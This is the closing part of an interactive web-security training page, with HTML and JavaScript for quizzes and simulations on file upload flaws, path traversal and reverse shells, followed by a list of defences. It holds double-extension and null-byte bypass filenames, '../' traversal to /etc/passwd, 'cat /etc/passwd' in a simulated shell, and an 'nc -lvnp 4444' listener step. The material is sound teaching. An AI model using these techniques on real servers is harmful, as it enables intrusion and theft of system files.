+<div class="qqo"><div class="qop" onclick="answer(9,this,'w')">They are the same thing</div><div class="qop" onclick="answer(9,this,'c')">Storage = where the file is saved; Execution = whether the server interprets it as code</div><div class="qop" onclick="answer(9,this,'w')">Storage happens after execution</div></div><div class="qfb" id="fb9"></div></div>
+</div></section>
+
+<section class="sec" id="finalvis">
+<div class="snum">25</div>
+<div class="sh"><div class="stag">// FINAL</div><h2 class="stit">Summary — The Complete Picture</h2><p class="sdesc">One clean diagram to remember the entire attack flow.</p></div>
+<div class="cd" style="margin-bottom:20px"><div style="text-align:center;padding:20px">
+<div class="cvis" style="margin:0">
+<div class="cvn" style="border-color:var(--red)"><div class="cnt2" style="color:var(--red)">ATTACKER-CONTROLLED FILE</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">UPLOAD ACCEPTED</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">STORED</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">WEB ACCESSIBLE</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">SERVER INTERPRETS AS CODE</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">SERVER-SIDE EXECUTION</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">OUTBOUND CONNECTION</div></div><div class="cva act"></div>
+<div class="cvn"><div class="cnt2">ATTACKER LISTENER</div></div><div class="cva act"></div>
+<div class="cvn" style="border-color:var(--green)"><div class="cnt2" style="color:var(--green)">INTERACTIVE SHELL</div></div>
+</div></div></div>
+<div class="cd"><div style="text-align:center;padding:20px">
+<div style="font-family:var(--disp);font-size:16px;font-weight:800;color:var(--bright);margin-bottom:12px">Three Key Distinctions</div>
+<div style="font-size:13px;color:var(--dim);line-height:2;font-family:var(--mono)">
+<span style="color:var(--red)">File Upload Vulnerability</span> created the opportunity.<br>
+<span style="color:var(--cyan)">Server-Side Execution</span> created the impact.<br>
+<span style="color:var(--green)">The Reverse Shell</span> created the interactive communication channel.</div></div></div>
+<div class="cd" style="margin-top:20px"><h3 style="font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700;color:var(--cyan)">Defense in Depth — Every Stage Can Be Secured</h3>
+<div class="mi"><div class="mii">🔒</div><div><div class="mit">Strong upload validation</div><div class="mid">Allowlist extensions + content inspection + magic bytes</div></div></div>
+<div class="mi"><div class="mii">📁</div><div><div class="mit">Store outside webroot</div><div class="mid">Random filenames, served through application logic</div></div></div>
+<div class="mi"><div class="mii">🚫</div><div><div class="mit">Disable execution in upload directories</div><div class="mid">Server config / .htaccess prevents code execution</div></div></div>
+<div class="mi"><div class="mii">🔥</div><div><div class="mit">Egress filtering</div><div class="mid">Outbound firewall rules restrict unauthorized connections</div></div></div>
+<div class="mi"><div class="mii">👤</div><div><div class="mit">Least-privilege web service account</div><div class="mid">Minimize impact when execution occurs</div></div></div>
+<div class="mi"><div class="mii">📋</div><div><div class="mit">Path normalization before validation</div><div class="mid">Resolve ../ before checking allowed directories</div></div></div>
+</div></section>
+</div>
+<script>
+function scr(id){document.getElementById(id).scrollIntoView({behavior:'smooth'});document.getElementById('sidebar').classList.remove('open')}
+const sections=document.querySelectorAll('.sec,#hero');
+const navItems=document.querySelectorAll('.ni2');
+const pf=document.getElementById('pf2');const plbl=document.getElementById('plbl');const tpf=document.getElementById('top-pf');
+let visited=new Set();
+window.addEventListener('scroll',function(){
+  let current='hero';
+  sections.forEach(function(s){if(window.scrollY>=s.offsetTop-200)current=s.id});
+  navItems.forEach(function(n){n.classList.remove('active');if(n.getAttribute('onclick')&&n.getAttribute('onclick').includes(current))n.classList.add('active')});
+  visited.add(current);
+  let pct=Math.round((visited.size/26)*100);
+  pf.style.width=pct+'%';plbl.textContent=pct+'% Complete';
+  let total=document.documentElement.scrollHeight-window.innerHeight;
+  tpf.style.width=(window.scrollY/total*100)+'%';
+});
+function showFT(t){
+  document.getElementById('ft-static').style.display=t==='static'?'block':'none';
+  document.getElementById('ft-exec').style.display=t==='exec'?'block':'none';
+  document.getElementById('btn-static').style.borderColor=t==='static'?'var(--green)':'var(--border)';
+  document.getElementById('btn-static').style.color=t==='static'?'var(--green)':'var(--dim)';
+  document.getElementById('btn-exec').style.borderColor=t==='exec'?'var(--red)':'var(--border)';
+  document.getElementById('btn-exec').style.color=t==='exec'?'var(--red)':'var(--dim)';
+}
+function inspF(name){
+  var data={
+    'profile.jpg':{ext:'.jpg',mime:'image/jpeg',magic:'FF D8 FF',content:'Image data (245KB)',verdict:'SAFE - legitimate image file'},
+    'shell.php':{ext:'.php',mime:'application/x-php',magic:'3C 3F 70 68 70',content:'PHP code: system([cmd])',verdict:'DANGEROUS - executable PHP code'},
+    'resume.php.jpg':{ext:'.jpg (double: .php.jpg)',mime:'image/jpeg (spoofed)',magic:'3C 3F 70 68 70',content:'PHP code disguised as JPEG',verdict:'DANGEROUS - double extension bypass'},
+    'image.php%00.jpg':{ext:'.jpg (null byte)',mime:'image/jpeg',magic:'3C 3F 70 68 70',content:'PHP code with null byte truncation',verdict:'DANGEROUS - null byte bypass (legacy)'},
+    'photo.png':{ext:'.png',mime:'image/png',magic:'89 50 4E 47',content:'Image data (180KB)',verdict:'SAFE - legitimate PNG image'}
+  };
+  var d=data[name];if(!d)return;
+  var el=document.getElementById('inp-body');
+  var vColor=d.verdict.indexOf('DANGEROUS')>=0?'td2':'ts';
+  el.innerHTML='<span class="tl"><span class="tcm">// Analyzing: '+name+'</span></span>'+
+'<span class="tl"><span class="tp">Filename:</span> '+name+'</span>'+
+'<span class="tl"><span class="tp">Extension:</span> <span class="'+vColor+'">'+d.ext+'</span></span>'+
+'<span class="tl"><span class="tp">MIME Type:</span> '+d.mime+'</span>'+
+'<span class="tl"><span class="tp">Magic Bytes:</span> '+d.magic+'</span>'+
+'<span class="tl"><span class="tp">Content:</span> '+d.content+'</span>'+
+'<span class="tl">&nbsp;</span>'+
+'<span class="tl"><span class="'+vColor+'">'+d.verdict+'</span></span>';
+}
+var shellOutputs={
+  'whoami':'www-data',
+  'ls /var/www/html':'index.html  uploads/  assets/  config.php',
+  'cat /etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+  'id':'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+  'uname -a':'Linux training-server 5.4.0 #1 SMP x86_64 GNU/Linux'
+};
+function rsc(cmd){
+  var el=document.getElementById('shell-term');
+  var out=shellOutputs[cmd]||'bash: '+cmd+': command not found';
+  el.innerHTML=el.innerHTML+'\n<span class="tl"><span class="tp">$</span> '+cmd+'</span>\n<span class="tl"><span class="ts">'+out+'</span></span>\n<span class="tl"><span class="tp">$</span> <span class="tc">_</span></span>';
+  el.scrollTop=el.scrollHeight;
+}
+function resetShell(){
+  document.getElementById('shell-term').innerHTML='<span class="tl"><span class="tcm"># Simulated web shell - no real execution</span></span>\n<span class="tl"><span class="tp">$</span> <span class="tc" id="shell-cmd">_</span></span>';
+}
+function togByp(el){var d=el.querySelector('.bdet');if(d)d.style.display=d.style.display==='none'?'block':'none';}
+function updTrav(v){
+  var paths=['/var/www/html/images/','/var/www/html/','/var/www/','/var/','/','/'];
+  var descs=['Starting: /var/www/html/images/','One level up: /var/www/html/','Two levels: /var/www/','Three levels: /var/','Four levels: / (root)','Five levels: still / (root)'];
+  var disp=document.getElementById('trav-disp');
+  var html='';
+  for(var i=parseInt(v);i>=0;i--){
+    var cls=i==parseInt(v)?'fn2 ad':i===0?'fn2 tf':'fn2';
+    html+='<div class="'+cls+'">'+(i===0?'target':'../')+'</div>';
+    if(i>0)html+='<div style="color:var(--dim);font-size:14px">-></div>';
+  }
+  disp.innerHTML=html;
+  var phtml='';
+  var pathParts=paths[parseInt(v)].split('/').filter(Boolean);
+  pathParts.forEach(function(p,i){
+    var cls=i>=pathParts.length-parseInt(v)&&parseInt(v)>0?'psg t':'psg n';
+    phtml+='<span class="'+cls+'">'+p+'/</span>';
+  });
+  if(parseInt(v)===0)phtml='<span class="psg tg2">dog.jpg</span><span class="psg n"> (normal file access)</span>';
+  document.getElementById('trav-path').innerHTML=phtml||'<span class="psg n">/</span>';
+  document.getElementById('trav-exp').textContent=descs[parseInt(v)];
+}
+function setPay(v){document.getElementById('payin').value=v;testPay(v);}
+function testPay(v){
+  var el=document.getElementById('pay-res');
+  if(v==='dog.jpg'){el.style.borderColor='var(--green)';el.style.color='var(--green)';el.innerHTML='<strong>IMAGE LOADED</strong><br>Normal file - server responds with image data.';return;}
+  if(v.indexOf('..')>=0&&v.indexOf('etc/passwd')>=0){
+    var depth=(v.match(/\.\.\//g)||[]).length;
+    if(depth>=3){el.style.borderColor='var(--accent)';el.style.color='var(--accent)';el.innerHTML='<strong>FILE EXPOSED</strong><br>Traversal succeeded! '+depth+'x ../ reached /etc/passwd<br><span style="color:var(--green)">root:x:0:0:root:/root:/bin/bash</span>';}
+    else{el.style.borderColor='var(--red)';el.style.color='var(--red)';el.innerHTML='<strong>NOT FOUND</strong><br>Only '+depth+'x ../ - insufficient depth. Need at least 3.';}
+  }else if(v==='/etc/passwd'){
+    el.style.borderColor='var(--accent)';el.style.color='var(--accent)';el.innerHTML='<strong>ABSOLUTE PATH</strong><br>If server accepts absolute paths, this reads /etc/passwd directly.';} 
+  else{el.style.borderColor='var(--border)';el.style.color='var(--dim)';el.innerHTML='Testing: '+v+'...';}
+}
+var chainTimer=null;
+function animChain(){
+  resetChain();
+  var i=1;
+  chainTimer=setInterval(function(){
+    if(i>8){clearInterval(chainTimer);return;}
+    document.getElementById('ch'+i).classList.add('act');
+    if(i>1)document.getElementById('ca'+(i-1)).classList.add('act');
+    if(i===8)document.getElementById('ch'+i).classList.add('done');
+    i++;
+  },600);
+}
+function resetChain(){
+  if(chainTimer)clearInterval(chainTimer);
+  for(var i=1;i<=8;i++){document.getElementById('ch'+i).classList.remove('act','done');if(i<8)document.getElementById('ca'+i).classList.remove('act');}
+}
+var listenerOn=false;
+function togLis(){
+  listenerOn=!listenerOn;
+  var term=document.getElementById('lis-term');
+  var btn=document.getElementById('btn-lis');
+  var conn=document.getElementById('btn-conn');
+  if(listenerOn){
+    term.innerHTML='<span class="tl"><span class="ts">LISTENING on 0.0.0.0:4444</span></span><span class="tl"><span class="tcm">Waiting for incoming connection...</span></span>';
+    btn.textContent='Stop Listener';btn.className='btn br';
+    conn.disabled=false;
+  }else{
+    term.innerHTML='<span class="tl"><span class="td2">No listener active</span></span><span class="tl"><span class="tcm">Click Start Listener to begin</span></span>';
+    btn.textContent='Start Listener';btn.className='btn bgn';
+    conn.disabled=true;
+  }
+}
+function simConn(){
+  var term=document.getElementById('lis-term');
+  if(listenerOn){
+    term.innerHTML=term.innerHTML+'<span class="tl"><span class="ta">Connection received from 10.10.10.20:54321</span></span><span class="tl"><span class="ts">Connection established</span></span><span class="tl"><span class="tcm">bash-4.4$ _</span></span>';
+  }else{
+    term.innerHTML=term.innerHTML+'<span class="tl"><span class="td2">Connection refused - no listener on port 4444</span></span>';
+  }
+}
+function chkEA(btn,r){
+  var res=document.getElementById('ea-res');
+  res.style.display='block';
+  if(r==='c'){
+    btn.style.borderColor='var(--green)';btn.style.color='var(--green)';
+    res.innerHTML='<div class="hb2 hbg" style="font-size:12px"><strong style="color:var(--green)">CORRECT</strong><br>Code executes on the WEB SERVER - in the security context of the web server process (e.g., www-data).</div>';
+  }else{
+    btn.style.borderColor='var(--red)';btn.style.color='var(--red)';
+    res.innerHTML='<div class="hb2 hbr" style="font-size:12px"><strong style="color:var(--red)">INCORRECT</strong><br>Server-side code executes on the web server, not on the client or attacker machine.</div>';
+  }
+}
+var atkSteps=[
+  {title:'Step 1 - Prepare',desc:'The tester has server-side executable content designed for the authorized lab environment. They know the server technology (e.g., PHP), upload restrictions, and their callback address.',color:'var(--cyan)'},
+  {title:'Step 2 - Upload',desc:'Tester sends an HTTP multipart POST request containing the PHP file. The request includes filename, Content-Type, and file body.',color:'var(--cyan)'},
+  {title:'Step 3 - Validation Failure',desc:'The application checks extension, MIME type, content - but misses something. FILE ACCEPTED. We still do NOT have a shell.',color:'var(--red)'},
+  {title:'Step 4 - Storage',desc:'File is stored at /var/www/html/uploads/. It is web-accessible and potentially executable depending on server config.',color:'var(--cyan)'},
+  {title:'Step 5 - Listener Ready',desc:'Attacker starts a listener on their machine: nc -lvnp 4444. Waiting for incoming connection.',color:'var(--green)'},
+  {title:'Step 6 - Trigger',desc:'Browser requests /uploads/example-file. The web server finds the file. Requesting the file does NOT automatically mean execution.',color:'var(--cyan)'},
+  {title:'Step 7 - Server-Side Execution',desc:'THE CRITICAL TRANSITION. The web server/runtime interprets the file as code. Code executes ON THE SERVER under the web application OS context.',color:'var(--red)'},
+  {title:'Step 8 - Outbound Connection',desc:'The executed code initiates an outbound TCP connection to the attacker IP:port. Firewall rules determine if this succeeds.',color:'var(--amber)'},
+  {title:'Step 9 - Listener Accepts',desc:'Attacker listener receives the incoming connection. Shell input/output channel is established.',color:'var(--green)'},
+  {title:'Step 10 - Interactive Shell',desc:'ATTACKER KEYBOARD -> NETWORK -> TARGET SHELL -> COMMAND -> OS -> OUTPUT -> NETWORK -> ATTACKER TERMINAL. Full interactive access.',color:'var(--green)'}
+];
+var atkIdx=0;
+function atkNext(){
+  if(atkIdx>=atkSteps.length)return;
+  var s=atkSteps[atkIdx];
+  var pills=document.getElementById('atk-pills');
+  pills.innerHTML=pills.innerHTML+'<div class="step-pill act">'+(atkIdx+1)+'</div>';
+  document.querySelectorAll('.step-pill').forEach(function(p,i){if(i<atkIdx)p.classList.replace('act','done');});
+  var content=document.getElementById('atk-content');
+  content.innerHTML='<div style="padding:16px;border:1px solid var(--border);border-radius:10px;border-left:3px solid '+s.color+'"><div style="font-weight:600;font-size:14px;color:'+s.color+';margin-bottom:8px">'+s.title+'</div><div style="font-size:13px;color:var(--dim);line-height:1.7">'+s.desc+'</div></div>';
+  atkIdx++;
+  if(atkIdx>=atkSteps.length)document.getElementById('atk-next').disabled=true;
+}
+function atkReset(){
+  atkIdx=0;
+  document.getElementById('atk-pills').innerHTML='';
+  document.getElementById('atk-content').innerHTML='';
+  document.getElementById('atk-next').disabled=false;
+}
+function applyBreak(el,num){
+  document.querySelectorAll('.bkc').forEach(function(b){b.classList.remove('apl')});
+  el.classList.add('apl');el.querySelector('.bcs').textContent='APPLIED';
+  var breaks={
+    1:{chain:['UPLOAD BLOCKED','---','---','---','---','---','---'],result:'UPLOAD BLOCKED - Strong validation prevents the malicious file from being accepted.'},
+    2:{chain:['UPLOAD OK','STORED (safe)','---','EXECUTION FAIL','---','---','---'],result:'STORED OUTSIDE WEBROOT - Upload succeeds but file is not web-accessible.'},
+    3:{chain:['UPLOAD OK','STORED','REACHABLE','EXECUTION FAIL','---','---','---'],result:'EXECUTION DISABLED - Server config blocks script execution in upload directory.'},
+    4:{chain:['UPLOAD OK','STORED (random)','---','---','---','---','---'],result:'RANDOM FILENAMES - Attacker cannot predict stored filename. Retrieval becomes difficult.'},
+    5:{chain:['UPLOAD OK','STORED','REACHABLE','EXECUTION OK','CONNECTION FAIL','---','---'],result:'EGRESS FILTERED - Code may execute but outbound connection is blocked by firewall.'},
+    6:{chain:['UPLOAD OK','STORED','REACHABLE','EXECUTION (limited)','CONNECTION (limited)','---','---'],result:'LEAST PRIVILEGE - Execution occurs but web service account has minimal permissions.'}
+  };
+  var b=breaks[num];
+  var ids=['bk-up','bk-st','bk-rch','bk-ex','bk-cn','bk-ln','bk-sh'];
+  b.chain.forEach(function(s,i){
+    var el2=document.getElementById(ids[i]);
+    if(s.indexOf('FAIL')>=0||s.indexOf('BLOCKED')>=0){el2.style.background='rgba(34,197,94,0.08)';el2.style.borderColor='rgba(34,197,94,0.2)';el2.style.color='var(--green)';el2.textContent=s;}
+    else if(s.indexOf('OK')>=0||s.indexOf('APPLIED')>=0){el2.style.background='rgba(139,92,246,0.08)';el2.style.borderColor='rgba(139,92,246,0.2)';el2.style.color='var(--accent)';el2.textContent=s;}
+    else if(s.indexOf('limited')>=0){el2.style.background='rgba(245,158,11,0.08)';el2.style.borderColor='rgba(245,158,11,0.2)';el2.style.color='var(--amber)';el2.textContent=s;}
+  });
+  document.getElementById('break-result').innerHTML='<div style="padding:12px;border:1px solid rgba(34,197,94,0.12);border-radius:8px;background:rgba(34,197,94,0.04);color:var(--green)"><strong>'+b.result+'</strong></div>';
+}
+function sLT(id){
+  document.querySelectorAll('#m1labs .tp2').forEach(function(p){p.classList.remove('act')});
+  document.querySelectorAll('#m1labs .tb').forEach(function(b){b.classList.remove('act')});
+  document.getElementById(id).classList.add('act');
+  event.target.classList.add('act');
+}
+function sPLT(id){
+  document.querySelectorAll('#m2labs .tp2').forEach(function(p){p.classList.remove('act')});
+  document.querySelectorAll('#m2labs .tb').forEach(function(b){b.classList.remove('act')});
+  document.getElementById(id).classList.add('act');
+  event.target.classList.add('act');
+}
+var correctAnswers={
+  0:'Extensions are user-controlled and can be spoofed',
+  1:'Content-Type header is sent by the client and can be modified',
+  2:'The user controls the browser and can disable/bypass it',
+  3:'The server must interpret the file as executable code via its runtime',
+  4:'Navigate to parent directory (one level up)',
+  5:'A process waiting for an incoming network connection',
+  6:'The connection direction is reversed - target connects to attacker',
+  7:'Multiple conditions must succeed: execution, outbound connection, listener availability',
+  8:'No - it inherits the web server process privileges (e.g., www-data)',
+  9:'Storage = where the file is saved; Execution = whether the server interprets it as code'
+};
+var explanations={
+  0:'Extensions are set by the user. Attackers can use double extensions, alternative extensions, or encoding tricks.',
+  1:'Content-Type is part of the HTTP request. Burp Suite can modify it freely.',
+  2:'Client-side code runs in the browser. Users can disable JavaScript, modify DOM, or use a proxy.',
+  3:'Upload stores the file. Execution requires the runtime to interpret the file as code.',
+  4:'In Unix filesystems, .. refers to the parent directory. ../../ moves two levels up.',
+  5:'A listener binds to a port and waits for incoming TCP connections.',
+  6:'In a reverse shell, the target initiates the connection - reversed from a bind shell.',
+  7:'Upload success does not mean execution success. Execution success does not mean callback success.',
+  8:'The web server typically runs as a low-privilege user. Shell inherits those limited permissions.',
+  9:'A file can be stored without being executed. These are separate events.'
+};
+var score=0,answered=0;
+function answer(q,el,type){
+  var opts=el.parentElement.querySelectorAll('.qop');
+  opts.forEach(function(o){o.classList.add('dis')});
+  var fb=document.getElementById('fb'+q);
+  if(type==='c'){
+    el.classList.add('cor');fb.className='qfb sh cor';fb.innerHTML='Correct! '+explanations[q];score++;
+  }else{
+    el.classList.add('wro');fb.className='qfb sh wro';
+    opts.forEach(function(o){if(o.textContent===correctAnswers[q])o.classList.add('cor')});
+    fb.innerHTML='Incorrect. '+explanations[q];
+  }
+  answered++;
+  document.getElementById('q-score').textContent=score;
+  document.getElementById('q-count').textContent=answered+' / 10 answered';
+  document.getElementById('q-pf').style.width=(answered*10)+'%';
+}
+</script>
+</body>
+</html>
